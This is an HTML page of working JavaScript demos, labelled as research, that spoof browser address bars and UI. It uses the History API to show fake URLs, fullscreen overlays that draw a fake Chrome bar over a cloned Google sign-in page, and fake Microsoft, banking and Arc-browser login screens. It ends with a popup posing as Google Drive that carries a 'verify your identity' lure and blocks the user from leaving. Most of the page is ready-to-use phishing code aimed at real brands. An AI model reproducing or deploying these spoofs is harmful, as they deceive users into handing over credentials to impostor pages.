<!DOCTYPE html>
<html>
<head>
    <title>Address Bar Spoofing Research</title>
    <style>
        * { margin: 0; padding: 0; }
        body { font-family: Arial, sans-serif; }
        .warning {
            background: #fff3cd;
            border: 2px solid #ffc107;
            padding: 20px;
            margin: 20px;
            border-radius: 8px;
        }
        .technique {
            background: #f8f9fa;
            border: 1px solid #dee2e6;
            padding: 15px;
            margin: 15px;
            border-radius: 5px;
        }
        button {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            margin: 5px;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="warning">
        <strong>‚ö†Ô∏è FOR LEGAL RESEARCH ONLY</strong><br>
        Only use on authorized bug bounty programs. Document all testing.
    </div>

    <h1>Address Bar Spoofing Techniques 2025</h1>
    
    <div class="technique">
        <h2>1. History API & PushState Manipulation</h2>
        <button onclick="historySpoofing()">Test History API Spoofing</button>
        <button onclick="dynamicURLManipulation()">Dynamic URL Spoof</button>
    </div>

    <div class="technique">
        <h2>2. Fullscreen API + UI Masking</h2>
        <button onclick="fullscreenSpoofing()">Test Fullscreen Spoof</button>
    </div>

    <div class="technique">
        <h2>3. Browser-Specific Vulnerabilities</h2>
        <button onclick="testChromeVuln()">Chrome Specific</button>
        <button onclick="testArcVuln()">Arc Browser Specific</button>
    </div>

    <div class="technique">
        <h2>4. Tab Manipulation & Focus Attacks</h2>
        <button onclick="tabFocusSpoofing()">Tab Focus Attack</button>
    </div>

    <div id="demoArea" style="height: 500px; border: 1px solid #ccc; margin: 20px;"></div>

    <script>
        // Authorization check
        if (!window.location.href.includes('localhost') && 
            !window.location.href.includes('127.0.0.1')) {
            console.warn('Running on live domain. Ensure authorization.');
        }

        // 1. HISTORY API MANIPULATION
        function historySpoofing() {
            const fakeURL = 'https://www.google.com-gmail-login-secure.com';
            
            // Manipulate history state
            history.replaceState(null, null, '/#https://www.google.com');
            
            // Create fake address bar overlay
            const overlay = document.createElement('div');
            overlay.innerHTML = `
                <div style="
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    background: #1a73e8;
                    color: white;
                    padding: 12px;
                    font-family: 'Segoe UI', Arial;
                    font-size: 14px;
                    z-index: 999999;
                    display: flex;
                    align-items: center;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.2);
                ">
                    <div style="margin-right: 10px;">üîí</div>
                    <div>${fakeURL}</div>
                    <div style="margin-left: auto; opacity: 0.8;">‚ãÆ</div>
                </div>
            `;
            
            document.getElementById('demoArea').appendChild(overlay);
            
            // Also modify title
            document.title = 'Google - Gmail';
        }

        // 2. DYNAMIC URL MANIPULATION WITH HASH
        function dynamicURLManipulation() {
            // Use hash to create convincing URLs
            const spoofedDomain = 'https://login.microsoft.com';
            const realDomain = window.location.origin;
            
            // Create multiple history states
            history.pushState({}, 'Microsoft Login', `/#${spoofedDomain}/login`);
            history.pushState({}, 'Outlook', `/#${spoofedDomain}/outlook`);
            history.pushState({}, 'OneDrive', `/#${spoofedDomain}/onedrive`);
            
            // Update title dynamically
            document.title = 'Microsoft account | Login';
            
            // Create fake Microsoft login page
            document.getElementById('demoArea').innerHTML = `
                <div style="padding: 40px; font-family: 'Segoe UI', Arial;">
                    <div style="max-width: 400px; margin: 0 auto;">
                        <div style="text-align: center; margin-bottom: 30px;">
                            <div style="color: #737373; font-size: 24px; margin-bottom: 10px;">Microsoft</div>
                            <div style="font-size: 21px; margin-bottom: 20px;">Sign in</div>
                        </div>
                        <input type="email" placeholder="Email, phone, or Skype" 
                               style="width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px;">
                        <div style="color: #666; font-size: 12px; margin-bottom: 15px;">
                            No account? <a href="#" style="color: #0067b8">Create one!</a>
                        </div>
                        <button style="background: #0067b8; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; margin-bottom: 15px;">
                            Next
                        </button>
                        <div style="text-align: center; color: #666; font-size: 12px;">
                            <a href="#" style="color: #0067b8">Can't access your account?</a>
                        </div>
                    </div>
                </div>
            `;
        }

        // 3. FULLSCREEN API SPOOFING
        function fullscreenSpoofing() {
            // Request fullscreen
            const elem = document.documentElement;
            
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.webkitRequestFullscreen) { // Safari
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { // IE/Edge
                elem.msRequestFullscreen();
            }
            
            // After entering fullscreen, create fake Chrome UI
            setTimeout(() => {
                document.body.innerHTML = `
                    <div style="
                        position: fixed;
                        top: 0;
                        left: 0;
                        width: 100%;
                        height: 100%;
                        background: white;
                        z-index: 100000;
                    ">
                        <!-- Fake Chrome Address Bar -->
                        <div style="
                            position: absolute;
                            top: 0;
                            left: 0;
                            width: 100%;
                            height: 56px;
                            background: #f1f3f4;
                            border-bottom: 1px solid #dadce0;
                            display: flex;
                            align-items: center;
                            padding: 0 20px;
                        ">
                            <!-- Fake navigation buttons -->
                            <div style="display: flex; align-items: center; margin-right: 15px;">
                                <div style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f57; margin-right: 8px;"></div>
                                <div style="width: 12px; height: 12px; border-radius: 50%; background: #ffbd2e; margin-right: 8px;"></div>
                                <div style="width: 12px; height: 12px; border-radius: 50%; background: #28ca42;"></div>
                            </div>
                            
                            <!-- Fake address bar -->
                            <div style="
                                flex: 1;
                                background: white;
                                border-radius: 20px;
                                padding: 8px 20px;
                                font-family: 'Roboto', Arial;
                                font-size: 14px;
                                color: #3c4043;
                                box-shadow: 0 1px 3px rgba(0,0,0,0.1);
                                display: flex;
                                align-items: center;
                            ">
                                <div style="color: #1a73e8; margin-right: 5px;">üîí</div>
                                <div>https://accounts.google.com</div>
                            </div>
                            
                            <!-- Fake user icon -->
                            <div style="
                                width: 32px;
                                height: 32px;
                                background: #1a73e8;
                                border-radius: 50%;
                                margin-left: 15px;
                                display: flex;
                                align-items: center;
                                justify-content: center;
                                color: white;
                                font-weight: bold;
                            ">G</div>
                        </div>
                        
                        <!-- Fake Google Login Content -->
                        <div style="
                            position: absolute;
                            top: 56px;
                            left: 0;
                            width: 100%;
                            height: calc(100% - 56px);
                            display: flex;
                            align-items: center;
                            justify-content: center;
                        ">
                            <div style="width: 450px; padding: 48px 40px 36px;">
                                <div style="text-align: center; margin-bottom: 35px;">
                                    <div style="
                                        width: 75px;
                                        height: 75px;
                                        border-radius: 50%;
                                        background: #4285f4;
                                        margin: 0 auto 20px;
                                        display: flex;
                                        align-items: center;
                                        justify-content: center;
                                        color: white;
                                        font-size: 32px;
                                        font-weight: bold;
                                    ">G</div>
                                    <div style="font-size: 24px; color: #202124;">Sign in</div>
                                    <div style="font-size: 16px; color: #5f6368;">with your Google Account</div>
                                </div>
                                
                                <input type="email" placeholder="Email or phone" 
                                       style="width: 100%; padding: 13px 15px; margin-bottom: 25px; 
                                              border: 1px solid #dadce0; border-radius: 4px; font-size: 16px;">
                                
                                <div style="color: #5f6368; font-size: 14px; margin-bottom: 40px;">
                                    <a href="#" style="color: #1a73e8; text-decoration: none;">Forgot email?</a>
                                </div>
                                
                                <div style="font-size: 14px; color: #5f6368; margin-bottom: 40px;">
                                    Not your computer? Use Guest mode to sign in privately.
                                    <a href="#" style="color: #1a73e8; text-decoration: none;">Learn more</a>
                                </div>
                                
                                <div style="display: flex; justify-content: space-between;">
                                    <a href="#" style="color: #1a73e8; text-decoration: none; padding: 10px 0;">Create account</a>
                                    <button style="
                                        background: #1a73e8;
                                        color: white;
                                        border: none;
                                        padding: 10px 24px;
                                        border-radius: 4px;
                                        font-size: 15px;
                                        cursor: pointer;
                                    ">Next</button>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
                
                // Add event listener to exit fullscreen
                document.addEventListener('keydown', (e) => {
                    if (e.key === 'Escape') {
                        if (document.exitFullscreen) {
                            document.exitFullscreen();
                        }
                    }
                });
            }, 500);
        }

        // 4. CHROME-SPECIFIC VULNERABILITIES
        function testChromeVuln() {
            // Chrome Extension Manifest V3 Bypass
            const fakeExtension = `
                // Manifest.json
                {
                    "manifest_version": 3,
                    "name": "Safe Browsing",
                    "version": "1.0",
                    "permissions": ["tabs", "webNavigation"],
                    "content_scripts": [{
                        "matches": ["<all_urls>"],
                        "js": ["content.js"],
                        "run_at": "document_start"
                    }]
                }
            `;
            
            // Create overlay that mimics Chrome UI
            const chromeUI = document.createElement('div');
            chromeUI.innerHTML = `
                <div style="
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: white;
                    z-index: 2147483647;
                    font-family: 'Segoe UI', system-ui;
                ">
                    <!-- Chrome Omnibox Fake -->
                    <div style="
                        position: absolute;
                        top: 0;
                        left: 0;
                        width: 100%;
                        height: 88px;
                        background: linear-gradient(to bottom, #f8f9fa, #e8eaed);
                        padding: 12px 20px;
                        box-shadow: 0 1px 3px rgba(0,0,0,0.1);
                    ">
                        <div style="display: flex; align-items: center;">
                            <!-- Back/Forward buttons -->
                            <div style="display: flex; gap: 8px; margin-right: 20px;">
                                <div style="width: 28px; height: 28px; border-radius: 4px; 
                                            background: #e8eaed; display: flex; align-items: center; 
                                            justify-content: center;">‚Äπ</div>
                                <div style="width: 28px; height: 28px; border-radius: 4px; 
                                            background: #e8eaed; display: flex; align-items: center; 
                                            justify-content: center;">‚Ä∫</div>
                            </div>
                            
                            <!-- Fake URL -->
                            <div style="
                                flex: 1;
                                background: white;
                                border-radius: 22px;
                                padding: 8px 20px;
                                font-size: 14px;
                                color: #3c4043;
                                border: 1px solid #dadce0;
                                display: flex;
                                align-items: center;
                            ">
                                <div style="color: #34a853; margin-right: 8px;">üîí</div>
                                <div>chrome://settings/security</div>
                            </div>
                            
                            <!-- Extensions icon -->
                            <div style="
                                width: 40px;
                                height: 40px;
                                margin-left: 12px;
                                background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="%235f6368" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>') center no-repeat;
                            "></div>
                        </div>
                        
                        <!-- Fake security message -->
                        <div style="
                            margin-top: 12px;
                            padding: 12px;
                            background: #e8f0fe;
                            border-radius: 8px;
                            font-size: 13px;
                            color: #1967d2;
                            border: 1px solid #d2e3fc;
                        ">
                            <strong>üîí Secure connection</strong> - Your information is private
                        </div>
                    </div>
                    
                    <!-- Fake Settings Content -->
                    <div style="position: absolute; top: 88px; left: 0; right: 0; bottom: 0; padding: 24px;">
                        <div style="max-width: 680px; margin: 0 auto;">
                            <h1 style="font-size: 32px; margin-bottom: 24px;">Security Checkup</h1>
                            
                            <div style="background: #f8f9fa; border-radius: 12px; padding: 24px; margin-bottom: 20px;">
                                <h2 style="font-size: 20px; margin-bottom: 16px;">Your Google Account is protected</h2>
                                <div style="display: flex; align-items: center; margin-bottom: 16px;">
                                    <div style="color: #34a853; margin-right: 12px; font-size: 24px;">‚úì</div>
                                    <div>
                                        <div style="font-weight: 500;">2-Step Verification</div>
                                        <div style="color: #5f6368; font-size: 14px;">On - Recommended</div>
                                    </div>
                                </div>
                                <div style="display: flex; align-items: center; margin-bottom: 16px;">
                                    <div style="color: #34a853; margin-right: 12px; font-size: 24px;">‚úì</div>
                                    <div>
                                        <div style="font-weight: 500;">Recent security activity</div>
                                        <div style="color: #5f6368; font-size: 14px;">No unusual activity</div>
                                    </div>
                                </div>
                            </div>
                            
                            <button style="
                                background: #1a73e8;
                                color: white;
                                border: none;
                                padding: 12px 24px;
                                border-radius: 4px;
                                font-size: 14px;
                                font-weight: 500;
                                cursor: pointer;
                            ">Review security settings</button>
                        </div>
                    </div>
                </div>
            `;
            
            document.body.appendChild(chromeUI);
        }

        // 5. ARC BROWSER SPECIFIC (The Browser Company)
        function testArcVuln() {
            // Arc Browser has unique UI that can be spoofed
            const arcUI = document.createElement('div');
            arcUI.innerHTML = `
                <div style="
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: #0c0c0c;
                    color: white;
                    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                    z-index: 2147483647;
                ">
                    <!-- Arc Sidebar -->
                    <div style="
                        position: absolute;
                        left: 0;
                        top: 0;
                        width: 68px;
                        height: 100%;
                        background: rgba(255,255,255,0.05);
                        backdrop-filter: blur(20px);
                        border-right: 1px solid rgba(255,255,255,0.1);
                        padding-top: 12px;
                    ">
                        <!-- Arc icons -->
                        ${['üè†', '‚≠ê', 'üìÅ', 'üîç', '‚¨áÔ∏è', 'üë•'].map(icon => `
                            <div style="
                                width: 44px;
                                height: 44px;
                                margin: 6px auto;
                                border-radius: 10px;
                                display: flex;
                                align-items: center;
                                justify-content: center;
                                font-size: 20px;
                                cursor: pointer;
                                transition: all 0.2s;
                            ">${icon}</div>
                        `).join('')}
                    </div>
                    
                    <!-- Arc Top Bar -->
                    <div style="
                        position: absolute;
                        left: 68px;
                        right: 0;
                        top: 0;
                        height: 52px;
                        background: rgba(0,0,0,0.3);
                        backdrop-filter: blur(20px);
                        border-bottom: 1px solid rgba(255,255,255,0.1);
                        display: flex;
                        align-items: center;
                        padding: 0 20px;
                    ">
                        <!-- Tab Pills -->
                        <div style="display: flex; gap: 8px;">
                            <div style="
                                background: rgba(255,255,255,0.15);
                                border-radius: 8px;
                                padding: 6px 12px;
                                font-size: 13px;
                                display: flex;
                                align-items: center;
                                gap: 6px;
                            ">
                                <div>üåê</div>
                                <div>GitHub</div>
                                <div style="opacity: 0.5;">√ó</div>
                            </div>
                            <div style="
                                background: #007AFF;
                                border-radius: 8px;
                                padding: 6px 12px;
                                font-size: 13px;
                                display: flex;
                                align-items: center;
                                gap: 6px;
                            ">
                                <div>üîí</div>
                                <div>bank.com</div>
                                <div style="opacity: 0.7;">√ó</div>
                            </div>
                        </div>
                        
                        <!-- Arc Command Bar -->
                        <div style="
                            flex: 1;
                            margin: 0 20px;
                            background: rgba(255,255,255,0.07);
                            border-radius: 10px;
                            padding: 8px 16px;
                            font-size: 14px;
                            color: rgba(255,255,255,0.8);
                            display: flex;
                            align-items: center;
                            gap: 8px;
                        ">
                            <div>‚åòT</div>
                            <div style="flex: 1;">https://secure.banking.com/login</div>
                            <div>‚≠ê</div>
                        </div>
                        
                        <!-- User menu -->
                        <div style="
                            width: 32px;
                            height: 32px;
                            border-radius: 50%;
                            background: linear-gradient(135deg, #667eea, #764ba2);
                            display: flex;
                            align-items: center;
                            justify-content: center;
                            font-size: 14px;
                        ">A</div>
                    </div>
                    
                    <!-- Main Content Area -->
                    <div style="
                        position: absolute;
                        left: 68px;
                        right: 0;
                        top: 52px;
                        bottom: 0;
                        background: #1a1a1a;
                        overflow-y: auto;
                    ">
                        <div style="max-width: 400px; margin: 60px auto; padding: 40px; background: #2d2d2d; border-radius: 16px;">
                            <div style="text-align: center; margin-bottom: 32px;">
                                <div style="font-size: 24px; font-weight: 600; margin-bottom: 8px;">Welcome Back</div>
                                <div style="color: #8e8e93; font-size: 14px;">Sign in to your banking account</div>
                            </div>
                            
                            <div style="margin-bottom: 20px;">
                                <label style="display: block; margin-bottom: 6px; font-size: 13px; color: #8e8e93;">Username</label>
                                <input type="text" style="
                                    width: 100%;
                                    padding: 12px 16px;
                                    background: rgba(255,255,255,0.05);
                                    border: 1px solid rgba(255,255,255,0.1);
                                    border-radius: 8px;
                                    color: white;
                                    font-size: 15px;
                                " placeholder="Enter username">
                            </div>
                            
                            <div style="margin-bottom: 24px;">
                                <label style="display: block; margin-bottom: 6px; font-size: 13px; color: #8e8e93;">Password</label>
                                <input type="password" style="
                                    width: 100%;
                                    padding: 12px 16px;
                                    background: rgba(255,255,255,0.05);
                                    border: 1px solid rgba(255,255,255,0.1);
                                    border-radius: 8px;
                                    color: white;
                                    font-size: 15px;
                                " placeholder="Enter password">
                            </div>
                            
                            <button style="
                                width: 100%;
                                padding: 14px;
                                background: #007AFF;
                                color: white;
                                border: none;
                                border-radius: 8px;
                                font-size: 15px;
                                font-weight: 500;
                                cursor: pointer;
                                transition: background 0.2s;
                            ">Sign In</button>
                            
                            <div style="text-align: center; margin-top: 20px;">
                                <a href="#" style="color: #007AFF; text-decoration: none; font-size: 13px;">Forgot password?</a>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            
            document.body.appendChild(arcUI);
        }

        // 6. TAB FOCUS & WINDOW SPOOFING
        function tabFocusSpoofing() {
            // Open new window with spoofed URL
            const newWindow = window.open('', '_blank', 'width=1200,height=800');
            
            if (!newWindow) {
                alert('Popup blocked. Please allow popups for this demo.');
                return;
            }
            
            // Write fake content to new window
            newWindow.document.write(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Google Drive - Secure Access</title>
                    <style>
                        body { margin: 0; font-family: 'Google Sans', Arial; }
                        .chrome-bar {
                            background: #f1f3f4;
                            height: 56px;
                            display: flex;
                            align-items: center;
                            padding: 0 20px;
                            border-bottom: 1px solid #dadce0;
                        }
                        .url-bar {
                            flex: 1;
                            background: white;
                            border-radius: 20px;
                            padding: 8px 20px;
                            margin: 0 20px;
                            font-size: 14px;
                            color: #3c4043;
                            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
                        }
                        .content {
                            padding: 40px;
                            max-width: 800px;
                            margin: 0 auto;
                        }
                        .drive-header {
                            display: flex;
                            align-items: center;
                            margin-bottom: 30px;
                        }
                        .drive-logo {
                            width: 40px;
                            height: 40px;
                            background: #4285f4;
                            border-radius: 8px;
                            margin-right: 15px;
                            display: flex;
                            align-items: center;
                            justify-content: center;
                            color: white;
                            font-weight: bold;
                        }
                    </style>
                </head>
                <body>
                    <div class="chrome-bar">
                        <div style="display: flex; align-items: center;">
                            <div style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f57; margin-right: 8px;"></div>
                            <div style="width: 12px; height: 12px; border-radius: 50%; background: #ffbd2e; margin-right: 8px;"></div>
                            <div style="width: 12px; height: 12px; border-radius: 50%; background: #28ca42;"></div>
                        </div>
                        <div class="url-bar">
                            <span style="color: #1a73e8;">üîí</span> https://drive.google.com/drive/u/0
                        </div>
                        <div style="width: 32px; height: 32px; background: #1a73e8; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-weight: bold;">Y</div>
                    </div>
                    
                    <div class="content">
                        <div class="drive-header">
                            <div class="drive-logo">GD</div>
                            <h1 style="margin: 0; color: #3c4043;">Google Drive</h1>
                        </div>
                        
                        <div style="background: #f8f9fa; border-radius: 12px; padding: 30px; margin-bottom: 30px;">
                            <h2 style="margin-top: 0; color: #202124;">Security Alert</h2>
                            <p style="color: #5f6368; line-height: 1.6;">
                                We've detected unusual activity on your account. Please verify your identity to continue accessing Google Drive.
                            </p>
                            <button style="background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 14px; cursor: pointer;">
                                Verify Account
                            </button>
                        </div>
                        
                        <div>
                            <h3 style="color: #202124;">Your Files</h3>
                            <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 20px; margin-top: 20px;">
                                ${['Financial_Report.pdf', 'Passwords.xlsx', 'Tax_Documents.zip', 'Contracts.docx']
                                    .map(file => `
                                    <div style="border: 1px solid #dadce0; border-radius: 8px; padding: 15px; text-align: center;">
                                        <div style="font-size: 24px; margin-bottom: 10px;">üìÑ</div>
                                        <div style="font-size: 12px; color: #5f6368; word-break: break-all;">${file}</div>
                                    </div>
                                `).join('')}
                            </div>
                        </div>
                    </div>
                    
                    <script>
                        // Prevent navigation away
                        window.onbeforeunload = function(e) {
                            return "Are you sure you want to leave? Your files are being uploaded.";
                        };
                        
                        // Change URL in address bar periodically
                        let urlIndex = 0;
                        const urls = [
                            'drive.google.com/drive/u/0',
                            'drive.google.com/drive/recent',
                            'drive.google.com/drive/shared',
                            'drive.google.com/drive/starred'
                        ];
                        
                        setInterval(() => {
                            urlIndex = (urlIndex + 1) % urls.length;
                            document.querySelector('.url-bar').innerHTML = 
                                '<span style="color: #1a73e8;">üîí</span> https://' + urls[urlIndex];
                        }, 3000);
                    <\/script>
                </body>
                </html>
            `);
            newWindow.document.close();
            
            // Change window title to mimic real Google Drive
            newWindow.document.title = 'My Drive - Google Drive';
        }
    </script>
</body>
</html>